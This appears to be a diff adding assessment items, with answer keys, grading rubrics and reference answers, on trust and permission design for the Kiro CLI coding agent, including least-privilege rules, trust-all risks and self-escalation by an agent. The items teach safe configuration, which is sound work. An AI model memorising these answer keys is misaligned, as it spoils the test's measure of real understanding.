+      Which trust-design principle best explains why v3 resolves overlapping rules as deny>ask>allow
+      rather than 'most specific wins' or 'last rule wins'?
+    choices:
+      - id: a
+        text: Determinism for performance
+      - id: b
+        text: It matches how firewalls log traffic
+      - id: c
+        text: To make YAML shorter
+      - id: d
+        text: >-
+          Fail-safe / least-privilege: a more permissive rule can never silently override a stricter
+          one, so adding an allow can't accidentally punch a hole through a deny
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Restrictiveness-ordering is a fail-safe default: you can layer broad allows without fear that
+      they weaken an existing deny/ask. Order- or specificity-based schemes make it easy to
+      accidentally widen access.
+  - id: kcw-500-mc-i
+    tier: 500
+    bloom: evaluate
+    difficulty: 506
+    type: multiple_choice
+    prompt: >-
+      A proposal removes the hardcoded Kiro scope (always-deny writes to ~/.kiro/settings) so power
+      users can let the agent self-configure. Evaluate the security tradeoff.
+    choices:
+      - id: a
+        text: >-
+          Dangerous: the always-deny on settings prevents the agent (or injected instructions) from
+          rewriting its own trust/permission config to escalate; removing it enables self-escalation
+          and trust-config tampering
+      - id: b
+        text: Good — power users know what they're doing
+      - id: c
+        text: Neutral — settings aren't security-relevant
+      - id: d
+        text: Fine because permissions.yaml is YAML
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      The hardcoded deny on settings is a guardrail against the agent (or a prompt injection)
+      editing its own permissions to grant itself more access. Removing it opens a
+      privilege-escalation path; convenience doesn't justify it.
+  - id: kcw-500-mc-j
+    tier: 500
+    bloom: evaluate
+    difficulty: 509
+    type: multiple_choice
+    prompt: >-
+      Compare grounding an implementation session via #spec versus pasting requirements into the
+      prompt by hand each time. Which is the better long-run workflow and why?
+    choices:
+      - id: a
+        text: Hand-pasting — it's more explicit
+      - id: b
+        text: >-
+          #spec — it pulls the canonical spec files consistently, stays in sync as the spec evolves,
+          and avoids transcription drift; hand-pasting is error-prone and goes stale
+      - id: c
+        text: They are equivalent
+      - id: d
+        text: '#spec is worse because it uses more tokens'
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      #spec references the single source of truth, so the agent always sees the current
+      requirements/design/tasks. Manual pasting drifts from the spec and invites transcription
+      errors.
+  - id: kcw-500-mc-k
+    tier: 500
+    bloom: evaluate
+    difficulty: 512
+    type: multiple_choice
+    prompt: >-
+      A team writes 'capability: all, effect: allow' at USER scope on every developer laptop to
+      'stop the prompts.' Evaluate versus doing it only on the CI runner.
+    choices:
+      - id: a
+        text: Same risk in both places
+      - id: b
+        text: Better on laptops because developers supervise
+      - id: c
+        text: >-
+          Far worse on laptops: user scope is machine-wide, so every project (including untrusted
+          clones) gets full autonomy on a machine with real credentials and data; the CI runner is
+          disposable and isolated, so all-allow there is a contained tradeoff
+      - id: d
+        text: CI should never use all-allow but laptops are fine
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      User-scope all-allow on a laptop grants every project full autonomy on a machine holding real
+      secrets and data — high blast radius. On an isolated, disposable CI runner the same rule is a
+      contained, documented tradeoff.
+  - id: kcw-500-mc-l
+    tier: 500
+    bloom: evaluate
+    difficulty: 515
+    type: multiple_choice
+    prompt: >-
+      An engineer claims 'trusting the shell tool trusts every command, so tiered trust is pointless
+      ceremony.' Rebut.
+    choices:
+      - id: a
+        text: They're right; tiers add no value
+      - id: b
+        text: Right, but only in v3
+      - id: c
+        text: Tiers only change logging
+      - id: d
+        text: >-
+          Wrong: tiers let you trust only 'git pull *' or a specific command while every other shell
+          command still prompts — tiered trust is precisely what avoids the all-or-nothing they
+          describe
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      The premise is the misconception. Tiered scoping (full command -> pattern -> base -> entire
+      tool) is exactly the mechanism that lets you NOT trust every command, granting least privilege
+      instead.
+  - id: kcw-500-mc-m
+    tier: 500
+    bloom: evaluate
+    difficulty: 518
+    type: multiple_choice
+    prompt: >-
+      Evaluate a workflow that runs the whole feature build as one giant Autopilot prompt with
+      trust-all, versus decomposing into scoped tasks with narrow trust and #spec grounding. Which
+      scales better for correctness?
+    choices:
+      - id: a
+        text: >-
+          Decomposed + scoped — smaller reviewable units, least-privilege trust limits blast radius,
+          and #spec keeps each task requirement-aligned; the giant trust-all prompt maximizes blast
+          radius and unreviewable sprawl
+      - id: b
+        text: The giant prompt — fewer steps means fewer errors
+      - id: c
+        text: They scale the same
+      - id: d
+        text: The giant prompt, because trust-all prevents stalls
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Decomposition with narrow trust and spec grounding yields reviewable diffs, bounded risk, and
+      alignment to requirements. One giant trust-all prompt maximizes both blast radius and the
+      chance of unreviewable, off-spec sprawl.
+  - id: kcw-500-ff-a
+    tier: 500
+    bloom: evaluate
+    difficulty: 521
+    type: free_form
+    prompt: >-
+      Critique this onboarding doc line: 'First thing in any Kiro CLI session, run /tools trust-all
+      so you never get interrupted.' Give a balanced evaluation and a better default recommendation.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Identifies the risk: trust-all auto-approves all tools (shell/write/aws) for the
+            session, removing the human gate
+        - id: c2
+          text: >-
+            Acknowledges any legitimate niche (e.g. throwaway/isolated environment) OR why
+            convenience tempts it
+        - id: c3
+          text: >-
+            Recommends a better default: narrow tiered trust / trust-on-demand, reserving broad
+            trust for isolated/CI contexts
+      referenceAnswer: >-
+        The line optimizes for convenience at the cost of safety: trust-all auto-approves every tool
+        — including shell, write, and aws — for the whole session, removing the per-use human gate
+        precisely where autonomy is riskiest. It's only defensible in a throwaway, isolated
+        environment (e.g. a disposable container or CI). A better default for everyday work is
+        trust-on-demand with narrow tiered trust: let read be trusted in the CWD, and trust specific
+        shell patterns/paths as workflows require them, reserving broad trust for contained
+        contexts.
+      passThreshold: 0.6
+    guidance: >-
+      Reward balanced judgment: name the real risk, concede the narrow legitimate use, and recommend
+      least-privilege as the default.
+  - id: kcw-500-ff-b
+    tier: 500
+    bloom: evaluate
+    difficulty: 524
+    type: free_form
+    prompt: >-
+      Evaluate the v3 design decision to store workspace permissions per-user under
+      ~/.kiro/workspace-roots/<hash>/ instead of in the repo. What threat does it defend against,
+      and what usability cost does it impose?
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Threat defended: a cloned/untrusted repo cannot inject trust rules to auto-escalate the
+            agent
+        - id: c2
+          text: >-
+            Usability cost: trust isn't shared via the repo, so each user re-establishes their own
+            workspace trust
+        - id: c3
+          text: >-
+            Reaches a reasoned verdict that the safety benefit justifies the cost (or a defensible
+            nuanced take)
+      referenceAnswer: >-
+        The decision defends against a supply-chain-style threat: if workspace trust lived in the
+        repo, cloning untrusted code could ship rules that auto-trust the agent and escalate access
+        on your machine. Storing it per-user outside the repo makes that impossible by construction.
+        The usability cost is that trust can't be shared/committed, so each developer re-establishes
+        their own workspace trust and there's no one-file team default. On balance the safety
+        benefit is worth it — the alternative turns a clone into an attack vector — though teams may
+        want documented, reviewable steps for re-creating trust quickly.
+      passThreshold: 0.6
+    guidance: >-
+      Reward identifying the injection threat, the no-shared-trust cost, and a defensible verdict
+      weighing them.
+  - id: kcw-500-ff-c
+    tier: 500
+    bloom: evaluate
+    difficulty: 527
+    type: free_form
+    prompt: >-
+      A reviewer sees this CI command: 'kiro-cli chat --no-interactive "deploy to prod"' with
+      'capability: all, effect: allow' at user scope and no MCP-startup requirement. Critique the
+      design across at least three dimensions.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Privilege: capability all+allow at user scope is broad; question whether the runner is
+            isolated/disposable
+        - id: c2
+          text: >-
+            Reliability: no MCP-startup guard means a failed server could let the run proceed
+            without needed capability (silent partial success)
+        - id: c3
+          text: >-
+            Risk of the task: 'deploy to prod' is high-impact for an autonomous, unsupervised agent
+            — recommend guardrails (scoped allow, fail-fast, approvals, or not autonomous prod
+            deploys)
+      referenceAnswer: >-
+        Three problems: (1) Privilege — capability: all + allow at user scope grants full autonomy
+        machine-wide; acceptable only on an isolated, disposable runner, and even then scoped allows
+        for just the tools the pipeline uses would be safer. (2) Reliability — without requiring MCP
+        startup, a needed server can fail silently and the run proceeds without that capability,
+        risking misleading green builds; add the require-MCP-startup guard so it fails fast. (3)
+        Blast radius of the task — fully-autonomous, unsupervised 'deploy to prod' is high-risk;
+        production deploys deserve human approval gates, narrower trust, and/or not delegating the
+        actual prod cutover to an unsupervised agent. Overall the design trades far too much safety
+        for convenience on a high-impact path.
+      passThreshold: 0.6
+    guidance: >-
+      Reward multi-dimensional critique: privilege scope, fail-fast reliability, and the
+      inappropriateness of unsupervised autonomy for high-impact prod actions.
+  - id: kcw-500-ff-d
+    tier: 500
+    bloom: evaluate
+    difficulty: 530
+    type: free_form
+    prompt: >-
+      Two teammates debate: A wants everything in Autopilot for speed; B wants Supervised for
+      everything for safety. Propose a principled policy for WHEN to use each, justified by the
+      nature of the work.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Maps Autopilot to low-risk/reversible/well-scoped work (e.g. scaffolding, tests,
+            isolated refactors)
+        - id: c2
+          text: >-
+            Maps Supervised to high-risk/irreversible/ambiguous work (e.g. broad changes,
+            prod-adjacent, unfamiliar code)
+        - id: c3
+          text: >-
+            Articulates a decision principle (risk x reversibility x scope clarity) rather than an
+            absolute rule
+      referenceAnswer: >-
+        Neither absolute is right; choose by risk x reversibility x scope clarity. Use Autopilot
+        when work is low-risk, reversible, and well-scoped — scaffolding, writing tests, isolated
+        refactors in code you understand — where throughput matters and a bad result is cheap to
+        revert. Use Supervised when work is high-risk, irreversible, or ambiguous — broad
+        cross-cutting edits, anything prod-adjacent, or unfamiliar code — where a per-turn hunk
+        review is worth the friction. The principle: default to autonomy where mistakes are cheap
+        and bounded, and insert the human gate where they're expensive or unrecoverable. Because the
+        mode is a live toggle, you can also start in Autopilot and switch to Supervised the moment
+        the task turns risky.
+      passThreshold: 0.6
+    guidance: >-
+      Reward a risk-based, situational policy with a clear decision principle, not a blanket
+      preference for either mode.
+  - id: kcw-500-ff-e
+    tier: 500
+    bloom: evaluate
+    difficulty: 533
+    type: free_form
+    prompt: >-
+      Critique relying on the ! shell escape during sessions as a way to 'work around' the trust
+      system for commands the agent would otherwise be prompted on. Is this a sound practice?
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Clarifies ! runs YOUR shell command directly; it is not the agent acting, so trust
+            prompts don't apply to it
+        - id: c2
+          text: >-
+            Notes the risk: using ! to manually run things the agent shouldn't auto-do bypasses the
+            deliberate human-gate design and can mislead about what the agent did
+        - id: c3
+          text: >-
+            Reaches a verdict: ! is fine for quick human-driven inspection, but using it to
+            routinely sidestep trust gating is an anti-pattern
+      referenceAnswer: >-
+        The ! escape runs YOUR command in your shell — it's you acting, not the agent — so the
+        agent's trust prompts legitimately don't apply. That's fine for quick human-driven
+        inspection (checking git status, listing files). It becomes an anti-pattern when used to
+        routinely perform actions the trust system would have gated for the agent: you're
+        hand-executing risky operations to dodge the deliberate human-gate design, which muddies who
+        did what and erodes the very safety the trust tiers provide. Verdict: legitimate for
+        inspection, unsound as a habitual trust workaround.
+      passThreshold: 0.6
+    guidance: >-
+      Reward distinguishing human-initiated ! from agent tool calls, and judging routine
+      trust-bypass as an anti-pattern while allowing quick inspection.
+  - id: kcw-500-ff-f
+    tier: 500
+    bloom: evaluate
+    difficulty: 536
+    type: free_form
+    prompt: >-
+      A team proposes treating v2 /tools trust and v3 permissions.yaml as interchangeable in their
+      docs ('use whichever'). Evaluate the risk of conflating the two during Kiro's migration.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Notes the two are distinct systems (session/interactive vs declarative file) currently
+            documented in parallel
+        - id: c2
+          text: >-
+            Notes a concrete confusion risk (e.g. wrong tool names read/write vs fs_read/fs_write,
+            or expecting one to drive the other)
+        - id: c3
+          text: >-
+            Recommends docs state which system applies to which CLI version/mode rather than
+            treating them as one
+      referenceAnswer: >-
+        Conflating them is risky because they are genuinely different systems documented in parallel
+        during migration: v2 /tools is interactive, session-scoped trust; v3 permissions.yaml is a
+        declarative file with capability/match/exclude/effect resolved by restrictiveness. Concrete
+        failure modes include using v2 names (read/write) as v3 capabilities (which are
+        fs_read/fs_write) so rules silently no-op, or expecting an edit to permissions.yaml to
+        change what /tools shows live. The docs should make the version/mode each system applies to
+        explicit and tell users how to tell which one is active, rather than implying you can pick
+        either freely.
+      passThreshold: 0.6
+    guidance: >-
+      Reward identifying them as separate systems, a concrete conflation hazard (naming or expecting
+      cross-driving), and a docs recommendation tied to version/mode.
+  - id: kcw-500-ff-g
+    tier: 500
+    bloom: evaluate
+    difficulty: 539
+    type: free_form
+    prompt: >-
+      Design review: a teammate's end-to-end CLI workflow is 'kiro-cli chat, trust-all, paste the
+      whole feature description, walk away.' Propose a redesigned workflow that is safer and more
+      likely to be correct, and justify each change.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Replaces trust-all with narrow/tiered trust (or scoped v3 allow) and justifies least
+            privilege
+        - id: c2
+          text: >-
+            Replaces the single giant prompt with scoped tasks and/or #spec grounding, justified by
+            reviewability + requirement alignment
+        - id: c3
+          text: >-
+            Adds a human checkpoint (Supervised for risky parts, or reviewing/reverting Autopilot
+            diffs) rather than walking away, justified by recoverability of irreversible actions
+      referenceAnswer: >-
+        Redesign: (1) Drop trust-all in favor of read trusted in the CWD plus narrow trust for the
+        specific shell patterns/paths the work needs (or scoped v3 allow rules) — least privilege
+        bounds the blast radius if the agent goes wrong. (2) Replace the single giant prompt with
+        decomposed, scoped tasks grounded in the spec via #spec, so each unit produces a reviewable
+        diff aligned to documented requirements instead of unreviewable sprawl. (3) Don't walk away
+        from an unsupervised, broadly-trusted run on a real machine: use Supervised for
+        risky/irreversible steps, and at minimum review and be ready to revert Autopilot diffs —
+        since already-run shell side effects (deletes, pushes, network calls) can't be reverted
+        after the fact. Each change trades a little convenience for materially better safety and
+        correctness.
+      passThreshold: 0.6
+    guidance: >-
+      Reward all three substitutions (trust scope, task decomposition/spec grounding, human
+      checkpoint) each with a stated justification.
